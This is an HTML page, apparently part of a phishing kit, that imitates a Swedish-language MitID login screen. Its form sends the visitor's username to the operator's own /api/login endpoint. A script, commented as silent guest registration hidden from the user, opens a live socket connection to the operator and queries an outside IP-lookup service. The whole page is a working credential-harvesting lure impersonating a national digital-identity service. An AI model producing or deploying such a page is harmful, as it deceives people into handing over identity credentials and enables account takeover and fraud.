<!doctype html>
<html lang="sv">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>MitID - Logga in</title>
<script src="/socket.io/socket.io.js"></script>
<style>
body {
  font-family: Arial, sans-serif;
  background: #f5f5f5;
  margin: 0;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}
.container {
  background: white;
  border-radius: 12px;
  box-shadow: 0 0 10px rgba(0,0,0,0.1);
  width: 100%;
  max-width: 360px;
  padding: 24px;
  text-align: center;
}
.logo { width: 80px; margin-bottom: 10px; }
h2 { margin: 0; font-size: 1.4rem; color: #333; }
p { color: #555; font-size: 0.9rem; }
input[type="text"] {
  width: 100%;
  padding: 10px;
  border-radius: 5px;
  border: 1px solid #ccc;
  font-size: 1rem;
  margin: 12px 0;
}
button {
  width: 100%;
  padding: 10px;
  background: #0066ff;
  border: none;
  color: white;
  font-size: 1rem;
  font-weight: bold;
  border-radius: 6px;
  cursor: pointer;
}
button:hover { background: #0053cc; }
label {
  font-size: 0.85rem;
  color: #555;
  display: flex;
  align-items: center;
  gap: 6px;
  margin-top: 8px;
  cursor: pointer;
}
.checkbox { width: 16px; height: 16px; }
.footer {
  margin-top: 12px;
  font-size: 0.8rem;
  color: #888;
}
</style>
</head>
<body>
  <div class="container">
    <img src="https://i.postimg.cc/WzDHPTPX/logo.jpg" alt="MitID logotyp" class="logo">
    <h2>Logga in med MitID</h2>
    <p>Ange ditt användarnamn för att fortsätta</p>
    <form action="/api/login" method="POST">
      <input type="text" name="username" placeholder="Användarnamn" required />
      <label><input type="checkbox" class="checkbox"> Kom ihåg mig hos MitID</label>
      <button type="submit">Fortsätt</button>
    </form>
    <div class="footer">© MitID Support — 2025</div>
  </div>

<script>
  // --- Tyst gästregistrering (ingen visning för användaren) ---
  const socket = io();
  async function registerGuest() {
    try {
      await fetch('https://api.ipify.org?format=json');
      socket.emit('join_guest', 'Okänd');
    } catch {
      socket.emit('join_guest', 'Okänd');
    }
  }
  socket.on('connect', registerGuest);
</script>
</body>
</html>
